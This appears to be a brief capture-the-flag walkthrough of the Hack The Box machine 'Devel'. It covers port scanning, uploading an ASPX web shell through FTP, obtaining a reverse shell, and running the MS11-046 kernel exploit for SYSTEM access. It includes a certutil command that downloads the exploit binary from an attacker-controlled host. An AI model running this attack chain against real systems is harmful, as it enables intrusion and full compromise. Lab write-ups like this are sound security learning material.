# Devel
- URL : https://app.hackthebox.eu/machines/3
- IP : `10.129.208.183`

## Information Gathering
- Port Scan
	- `rustscan -a 10.129.208.183 -r 1-65535`
	- 21 : FTP
	- 80 : Web

## FTP Services
- Try to connect to ftp
	- ![](https://i.imgur.com/NlEyGJA.png)
- Use Aspx Web shell
	- https://raw.githubusercontent.com/SecWiki/WebShell-2/master/Aspx/awen%20asp.net%20webshell.aspx
	- ![](https://i.imgur.com/kQiXZnv.png)

## Web Shell
- ![](https://i.imgur.com/lTQfQ5B.png)
- Install Reverse Shell
	- ASPX Reverse shell
	- https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx
## Reverse shell
- ![](https://i.imgur.com/QUwHk42.png)
- Check System Info
	- ![](https://i.imgur.com/X0rmprC.png)
		- user : `iis apppool\web`
	- ![](https://i.imgur.com/MVFpkLO.png)
		- System : Win 7 x64 6.1.7600 N/A Build 7600
	- ![](https://i.imgur.com/8coNqal.png)
		- Check Environment Variable
## Privilege Escalation
- With OS Version
	- ![](https://i.imgur.com/9jBTj6Z.png)
- Exploit : MS11-046 Kernel Exploits
	- https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-046
- Download Exploit file to target machine
	- `certutil -urlcache -f http://10.10.16.35:8000/ms11-046.exe ms11-046.exe`
		- ![](https://i.imgur.com/lTEY1uw.png)
- Run binary
	- ![](https://i.imgur.com/QnsjTtY.png)
	- Get System
- User Flag
	- ![](https://i.imgur.com/WVxjMQC.png)
- Root Flag
	- ![](https://i.imgur.com/chjisN8.png)
